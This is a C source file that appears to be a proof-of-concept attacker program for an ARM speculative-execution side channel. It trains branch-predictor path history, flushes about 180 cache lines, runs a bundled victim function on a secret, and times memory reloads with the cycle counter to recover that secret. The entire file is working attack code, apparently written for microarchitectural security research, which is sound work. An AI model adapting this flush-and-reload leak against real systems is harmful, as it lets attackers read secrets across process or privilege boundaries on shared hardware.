#include "Attacker.h"
#include "Victim.h"
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>
#include "evict_set.h"

unsigned char attacker_array[BYTE_MAX*Cache_Line];
int randa[BYTE_MAX];
unsigned long long difference[BYTE_MAX];
int len_array[BYTE_MAX*Cache_Line];
int times[BYTE_MAX];
char mark[BYTE_MAX];


#define USE_CACHE_NUM ((180))
static cache_ctx_t evict_set_list_attack_array[USE_CACHE_NUM];
static cache_ctx_t evict_set_list_len_array[USE_CACHE_NUM];

extern Elem** evsets;

#define flush(ptr) \
    asm volatile( \
        "DC CIVAC, %[ad]\n"\
        : \
        : [ad] "r" (ptr) \
    )


#define min(x, y) (x) < (y) ? (x) : (y)

int PHR_Flush(int length, int callLen) {
    int i;
    volatile int temp = 3;
    for(i = 0; i < PHR_LEN*8+1; i++) {
        i += (i+1)/(i+1)-1;
    }
    asm volatile("isb; dmb sy\n");
    
    temp+=func(callLen);
    temp += (temp+1)/(temp+1)-1;
    temp += (temp+1)/(temp+1)-1;
    temp += (temp+1)/(temp+1)-1;
    asm volatile("isb; dmb sy\n");
    i = -1;
    do {
        ++i;
    } while(i < len_array[i*Cache_Line]);
    temp += attacker_array[i * Cache_Line];
    return temp;
}

int main(int argc, char* argv[]) {


    for (int i = 0; i < USE_CACHE_NUM; i++) {
        evict_set_list_attack_array[i] = evsets_prepare((void*)attacker_array + i * Cache_Line);
        evict_set_list_len_array[i] = evsets_prepare((void*)len_array + i * Cache_Line);
    }

    unsigned long long start, end;
    unsigned char temp;
    int gened[BYTE_MAX];
    int secret;
    volatile int tmp = 0;
    for (int i = 0; i < BYTE_MAX; i++) gened[i] = 0;

    int reverse, flush_pht;
    if(argc >= 2)
        secret = atoi(argv[1]);
    else secret = 15;
    if (argc >= 3)
        reverse = atoi(argv[2]);
    else reverse = 0;
    srand(time(NULL));
    for(int i = 0; i < BYTE_MAX; i++) {
        int r = rand() % BYTE_MAX;
        while(gened[r])
            r = rand() % BYTE_MAX;
        gened[r] = 1;
        randa[i] = r;
    }

    //                            ret  first   first
    int phr_length_arm = (PHR_LEN - 1 - 1       - 1)/2*8+1; // [first, xx/8, ret, first, xx/8]
	for(int i = 0; i < BYTE_MAX; i++) {
		attacker_array[i*Cache_Line] = randa[i];
		difference[i] = 99999;
		len_array[i*Cache_Line] = phr_length_arm+10;
	}
    for (int k = 0; k < ATK_ROUNDS; k++) {
    // train S(0, 0, phr_length_arm) ~ S(0, phr_length_arm, 0)
        for (int i = 0; i < phr_length_arm+1; i++) {
			int t = reverse ? phr_length_arm+1-i : i;
			len_array[t*Cache_Line] = t;
            for (int j = 0; j < PHR_TRAIN_ROUNDS; j++) {
				tmp+=PHR_Flush(t, t);
                tmp+=(tmp+1)/(tmp+1)-1;
                tmp+=(tmp+1)/(tmp+1)-1;
                tmp+=(tmp+1)/(tmp+1)-1;
                asm volatile(
					"isb\n"
					"dsb sy\n"
				);
            }
			len_array[t*Cache_Line] = phr_length_arm+10;
        }

        // // attacker retrieve
        flush(attacker_array+0*Cache_Line); flush(len_array+0*Cache_Line);
        flush(attacker_array+1*Cache_Line); flush(len_array+1*Cache_Line);
        flush(attacker_array+2*Cache_Line); flush(len_array+2*Cache_Line);
        flush(attacker_array+3*Cache_Line); flush(len_array+3*Cache_Line);
        flush(attacker_array+4*Cache_Line); flush(len_array+4*Cache_Line);
        flush(attacker_array+5*Cache_Line); flush(len_array+5*Cache_Line);
        flush(attacker_array+6*Cache_Line); flush(len_array+6*Cache_Line);
        flush(attacker_array+7*Cache_Line); flush(len_array+7*Cache_Line);
        flush(attacker_array+8*Cache_Line); flush(len_array+8*Cache_Line);
        flush(attacker_array+9*Cache_Line); flush(len_array+9*Cache_Line);
        flush(attacker_array+10*Cache_Line); flush(len_array+10*Cache_Line);
        flush(attacker_array+11*Cache_Line); flush(len_array+11*Cache_Line);
        flush(attacker_array+12*Cache_Line); flush(len_array+12*Cache_Line);
        flush(attacker_array+13*Cache_Line); flush(len_array+13*Cache_Line);
        flush(attacker_array+14*Cache_Line); flush(len_array+14*Cache_Line);
        flush(attacker_array+15*Cache_Line); flush(len_array+15*Cache_Line);
        flush(attacker_array+16*Cache_Line); flush(len_array+16*Cache_Line);
        flush(attacker_array+17*Cache_Line); flush(len_array+17*Cache_Line);
        flush(attacker_array+18*Cache_Line); flush(len_array+18*Cache_Line);
        flush(attacker_array+19*Cache_Line); flush(len_array+19*Cache_Line);
        flush(attacker_array+20*Cache_Line); flush(len_array+20*Cache_Line);
        flush(attacker_array+21*Cache_Line); flush(len_array+21*Cache_Line);
        flush(attacker_array+22*Cache_Line); flush(len_array+22*Cache_Line);
        flush(attacker_array+23*Cache_Line); flush(len_array+23*Cache_Line);
        flush(attacker_array+24*Cache_Line); flush(len_array+24*Cache_Line);
        flush(attacker_array+25*Cache_Line); flush(len_array+25*Cache_Line);
        flush(attacker_array+26*Cache_Line); flush(len_array+26*Cache_Line);
        flush(attacker_array+27*Cache_Line); flush(len_array+27*Cache_Line);
        flush(attacker_array+28*Cache_Line); flush(len_array+28*Cache_Line);
        flush(attacker_array+29*Cache_Line); flush(len_array+29*Cache_Line);
        flush(attacker_array+30*Cache_Line); flush(len_array+30*Cache_Line);
        flush(attacker_array+31*Cache_Line); flush(len_array+31*Cache_Line);
        flush(attacker_array+32*Cache_Line); flush(len_array+32*Cache_Line);
        flush(attacker_array+33*Cache_Line); flush(len_array+33*Cache_Line);
        flush(attacker_array+34*Cache_Line); flush(len_array+34*Cache_Line);
        flush(attacker_array+35*Cache_Line); flush(len_array+35*Cache_Line);
        flush(attacker_array+36*Cache_Line); flush(len_array+36*Cache_Line);
        flush(attacker_array+37*Cache_Line); flush(len_array+37*Cache_Line);
        flush(attacker_array+38*Cache_Line); flush(len_array+38*Cache_Line);
        flush(attacker_array+39*Cache_Line); flush(len_array+39*Cache_Line);
        flush(attacker_array+40*Cache_Line); flush(len_array+40*Cache_Line);
        flush(attacker_array+41*Cache_Line); flush(len_array+41*Cache_Line);
        flush(attacker_array+42*Cache_Line); flush(len_array+42*Cache_Line);
        flush(attacker_array+43*Cache_Line); flush(len_array+43*Cache_Line);
        flush(attacker_array+44*Cache_Line); flush(len_array+44*Cache_Line);
        flush(attacker_array+45*Cache_Line); flush(len_array+45*Cache_Line);
        flush(attacker_array+46*Cache_Line); flush(len_array+46*Cache_Line);
        flush(attacker_array+47*Cache_Line); flush(len_array+47*Cache_Line);
        flush(attacker_array+48*Cache_Line); flush(len_array+48*Cache_Line);
        flush(attacker_array+49*Cache_Line); flush(len_array+49*Cache_Line);
        flush(attacker_array+50*Cache_Line); flush(len_array+50*Cache_Line);
        flush(attacker_array+51*Cache_Line); flush(len_array+51*Cache_Line);
        flush(attacker_array+52*Cache_Line); flush(len_array+52*Cache_Line);
        flush(attacker_array+53*Cache_Line); flush(len_array+53*Cache_Line);
        flush(attacker_array+54*Cache_Line); flush(len_array+54*Cache_Line);
        flush(attacker_array+55*Cache_Line); flush(len_array+55*Cache_Line);
        flush(attacker_array+56*Cache_Line); flush(len_array+56*Cache_Line);
        flush(attacker_array+57*Cache_Line); flush(len_array+57*Cache_Line);
        flush(attacker_array+58*Cache_Line); flush(len_array+58*Cache_Line);
        flush(attacker_array+59*Cache_Line); flush(len_array+59*Cache_Line);
        flush(attacker_array+60*Cache_Line); flush(len_array+60*Cache_Line);
        flush(attacker_array+61*Cache_Line); flush(len_array+61*Cache_Line);
        flush(attacker_array+62*Cache_Line); flush(len_array+62*Cache_Line);
        flush(attacker_array+63*Cache_Line); flush(len_array+63*Cache_Line);
        flush(attacker_array+64*Cache_Line); flush(len_array+64*Cache_Line);
        flush(attacker_array+65*Cache_Line); flush(len_array+65*Cache_Line);
        flush(attacker_array+66*Cache_Line); flush(len_array+66*Cache_Line);
        flush(attacker_array+67*Cache_Line); flush(len_array+67*Cache_Line);
        flush(attacker_array+68*Cache_Line); flush(len_array+68*Cache_Line);
        flush(attacker_array+69*Cache_Line); flush(len_array+69*Cache_Line);
        flush(attacker_array+70*Cache_Line); flush(len_array+70*Cache_Line);
        flush(attacker_array+71*Cache_Line); flush(len_array+71*Cache_Line);
        flush(attacker_array+72*Cache_Line); flush(len_array+72*Cache_Line);
        flush(attacker_array+73*Cache_Line); flush(len_array+73*Cache_Line);
        flush(attacker_array+74*Cache_Line); flush(len_array+74*Cache_Line);
        flush(attacker_array+75*Cache_Line); flush(len_array+75*Cache_Line);
        flush(attacker_array+76*Cache_Line); flush(len_array+76*Cache_Line);
        flush(attacker_array+77*Cache_Line); flush(len_array+77*Cache_Line);
        flush(attacker_array+78*Cache_Line); flush(len_array+78*Cache_Line);
        flush(attacker_array+79*Cache_Line); flush(len_array+79*Cache_Line);
        flush(attacker_array+80*Cache_Line); flush(len_array+80*Cache_Line);
        flush(attacker_array+81*Cache_Line); flush(len_array+81*Cache_Line);
        flush(attacker_array+82*Cache_Line); flush(len_array+82*Cache_Line);
        flush(attacker_array+83*Cache_Line); flush(len_array+83*Cache_Line);
        flush(attacker_array+84*Cache_Line); flush(len_array+84*Cache_Line);
        flush(attacker_array+85*Cache_Line); flush(len_array+85*Cache_Line);
        flush(attacker_array+86*Cache_Line); flush(len_array+86*Cache_Line);
        flush(attacker_array+87*Cache_Line); flush(len_array+87*Cache_Line);
        flush(attacker_array+88*Cache_Line); flush(len_array+88*Cache_Line);
        flush(attacker_array+89*Cache_Line); flush(len_array+89*Cache_Line);
        flush(attacker_array+90*Cache_Line); flush(len_array+90*Cache_Line);
        flush(attacker_array+91*Cache_Line); flush(len_array+91*Cache_Line);
        flush(attacker_array+92*Cache_Line); flush(len_array+92*Cache_Line);
        flush(attacker_array+93*Cache_Line); flush(len_array+93*Cache_Line);
        flush(attacker_array+94*Cache_Line); flush(len_array+94*Cache_Line);
        flush(attacker_array+95*Cache_Line); flush(len_array+95*Cache_Line);
        flush(attacker_array+96*Cache_Line); flush(len_array+96*Cache_Line);
        flush(attacker_array+97*Cache_Line); flush(len_array+97*Cache_Line);
        flush(attacker_array+98*Cache_Line); flush(len_array+98*Cache_Line);
        flush(attacker_array+99*Cache_Line); flush(len_array+99*Cache_Line);
        flush(attacker_array+100*Cache_Line); flush(len_array+100*Cache_Line);
        flush(attacker_array+101*Cache_Line); flush(len_array+101*Cache_Line);
        flush(attacker_array+102*Cache_Line); flush(len_array+102*Cache_Line);
        flush(attacker_array+103*Cache_Line); flush(len_array+103*Cache_Line);
        flush(attacker_array+104*Cache_Line); flush(len_array+104*Cache_Line);
        flush(attacker_array+105*Cache_Line); flush(len_array+105*Cache_Line);
        flush(attacker_array+106*Cache_Line); flush(len_array+106*Cache_Line);
        flush(attacker_array+107*Cache_Line); flush(len_array+107*Cache_Line);
        flush(attacker_array+108*Cache_Line); flush(len_array+108*Cache_Line);
        flush(attacker_array+109*Cache_Line); flush(len_array+109*Cache_Line);
        flush(attacker_array+110*Cache_Line); flush(len_array+110*Cache_Line);
        flush(attacker_array+111*Cache_Line); flush(len_array+111*Cache_Line);
        flush(attacker_array+112*Cache_Line); flush(len_array+112*Cache_Line);
        flush(attacker_array+113*Cache_Line); flush(len_array+113*Cache_Line);
        flush(attacker_array+114*Cache_Line); flush(len_array+114*Cache_Line);
        flush(attacker_array+115*Cache_Line); flush(len_array+115*Cache_Line);
        flush(attacker_array+116*Cache_Line); flush(len_array+116*Cache_Line);
        flush(attacker_array+117*Cache_Line); flush(len_array+117*Cache_Line);
        flush(attacker_array+118*Cache_Line); flush(len_array+118*Cache_Line);
        flush(attacker_array+119*Cache_Line); flush(len_array+119*Cache_Line);
        flush(attacker_array+120*Cache_Line); flush(len_array+120*Cache_Line);
        flush(attacker_array+121*Cache_Line); flush(len_array+121*Cache_Line);
        flush(attacker_array+122*Cache_Line); flush(len_array+122*Cache_Line);
        flush(attacker_array+123*Cache_Line); flush(len_array+123*Cache_Line);
        flush(attacker_array+124*Cache_Line); flush(len_array+124*Cache_Line);
        flush(attacker_array+125*Cache_Line); flush(len_array+125*Cache_Line);
        flush(attacker_array+126*Cache_Line); flush(len_array+126*Cache_Line);
        flush(attacker_array+127*Cache_Line); flush(len_array+127*Cache_Line);
        flush(attacker_array+128*Cache_Line); flush(len_array+128*Cache_Line);
        flush(attacker_array+129*Cache_Line); flush(len_array+129*Cache_Line);
        flush(attacker_array+130*Cache_Line); flush(len_array+130*Cache_Line);
        flush(attacker_array+131*Cache_Line); flush(len_array+131*Cache_Line);
        flush(attacker_array+132*Cache_Line); flush(len_array+132*Cache_Line);
        flush(attacker_array+133*Cache_Line); flush(len_array+133*Cache_Line);
        flush(attacker_array+134*Cache_Line); flush(len_array+134*Cache_Line);
        flush(attacker_array+135*Cache_Line); flush(len_array+135*Cache_Line);
        flush(attacker_array+136*Cache_Line); flush(len_array+136*Cache_Line);
        flush(attacker_array+137*Cache_Line); flush(len_array+137*Cache_Line);
        flush(attacker_array+138*Cache_Line); flush(len_array+138*Cache_Line);
        flush(attacker_array+139*Cache_Line); flush(len_array+139*Cache_Line);
        flush(attacker_array+140*Cache_Line); flush(len_array+140*Cache_Line);
        flush(attacker_array+141*Cache_Line); flush(len_array+141*Cache_Line);
        flush(attacker_array+142*Cache_Line); flush(len_array+142*Cache_Line);
        flush(attacker_array+143*Cache_Line); flush(len_array+143*Cache_Line);
        flush(attacker_array+144*Cache_Line); flush(len_array+144*Cache_Line);
        flush(attacker_array+145*Cache_Line); flush(len_array+145*Cache_Line);
        flush(attacker_array+146*Cache_Line); flush(len_array+146*Cache_Line);
        flush(attacker_array+147*Cache_Line); flush(len_array+147*Cache_Line);
        flush(attacker_array+148*Cache_Line); flush(len_array+148*Cache_Line);
        flush(attacker_array+149*Cache_Line); flush(len_array+149*Cache_Line);
        flush(attacker_array+150*Cache_Line); flush(len_array+150*Cache_Line);
        flush(attacker_array+151*Cache_Line); flush(len_array+151*Cache_Line);
        flush(attacker_array+152*Cache_Line); flush(len_array+152*Cache_Line);
        flush(attacker_array+153*Cache_Line); flush(len_array+153*Cache_Line);
        flush(attacker_array+154*Cache_Line); flush(len_array+154*Cache_Line);
        flush(attacker_array+155*Cache_Line); flush(len_array+155*Cache_Line);
        flush(attacker_array+156*Cache_Line); flush(len_array+156*Cache_Line);
        flush(attacker_array+157*Cache_Line); flush(len_array+157*Cache_Line);
        flush(attacker_array+158*Cache_Line); flush(len_array+158*Cache_Line);
        flush(attacker_array+159*Cache_Line); flush(len_array+159*Cache_Line);
        flush(attacker_array+160*Cache_Line); flush(len_array+160*Cache_Line);
        flush(attacker_array+161*Cache_Line); flush(len_array+161*Cache_Line);
        flush(attacker_array+162*Cache_Line); flush(len_array+162*Cache_Line);
        flush(attacker_array+163*Cache_Line); flush(len_array+163*Cache_Line);
        flush(attacker_array+164*Cache_Line); flush(len_array+164*Cache_Line);
        flush(attacker_array+165*Cache_Line); flush(len_array+165*Cache_Line);
        flush(attacker_array+166*Cache_Line); flush(len_array+166*Cache_Line);
        flush(attacker_array+167*Cache_Line); flush(len_array+167*Cache_Line);
        flush(attacker_array+168*Cache_Line); flush(len_array+168*Cache_Line);
        flush(attacker_array+169*Cache_Line); flush(len_array+169*Cache_Line);
        flush(attacker_array+170*Cache_Line); flush(len_array+170*Cache_Line);
        flush(attacker_array+171*Cache_Line); flush(len_array+171*Cache_Line);
        flush(attacker_array+172*Cache_Line); flush(len_array+172*Cache_Line);
        flush(attacker_array+173*Cache_Line); flush(len_array+173*Cache_Line);
        flush(attacker_array+174*Cache_Line); flush(len_array+174*Cache_Line);
        flush(attacker_array+175*Cache_Line); flush(len_array+175*Cache_Line);
        flush(attacker_array+176*Cache_Line); flush(len_array+176*Cache_Line);
        flush(attacker_array+177*Cache_Line); flush(len_array+177*Cache_Line);
        flush(attacker_array+178*Cache_Line); flush(len_array+178*Cache_Line);
        flush(attacker_array+179*Cache_Line); flush(len_array+179*Cache_Line);
        flush(attacker_array+180*Cache_Line); flush(len_array+180*Cache_Line);

        // #include "unroll_code.c"


        // trigger victim
        // volatile int length = BYTE_MAX-1;
        // flush(&length);
        tmp+=PHR_Flush(phr_length_arm+8, secret);
        // tmp+=attacker_array[255*Cache_Line];
        unsigned int tsc_aux;
        for (int i = 0; i < BYTE_MAX; i++) {
			int idx = randa[(i+k)%BYTE_MAX];
            asm volatile (
				"isb \n"
				"dsb sy\n"
				"mrs %[times], PMCCNTR_EL0\n"
				:[times]"=&r"(start)
				::
			);
			temp = *(unsigned char*)(attacker_array+idx*Cache_Line);
			asm volatile (
				"isb \n"
				"dsb sy\n"
				"mrs %[times], PMCCNTR_EL0\n"
				:[times]"=&r"(end)
				::
			);
			times[idx] += (end-start) <= HIT_THRESHOLD;
        }
    }
    for(int i = 0; i < phr_length_arm+1; i++) {
        // printf("%d ", times[i]);
        mark[i] = times[i] >= TIMES_THRESHOLD;
    }
    // puts("");
    for(int i = 0; i < phr_length_arm+1; i++)
    //for(int i = 0; i < 178; i++)
        if(mark[i]) {
            printf("confidence [%d] hit at: %d, means secret equals %d\n", times[i], i, i);
        }
    // puts("");
}
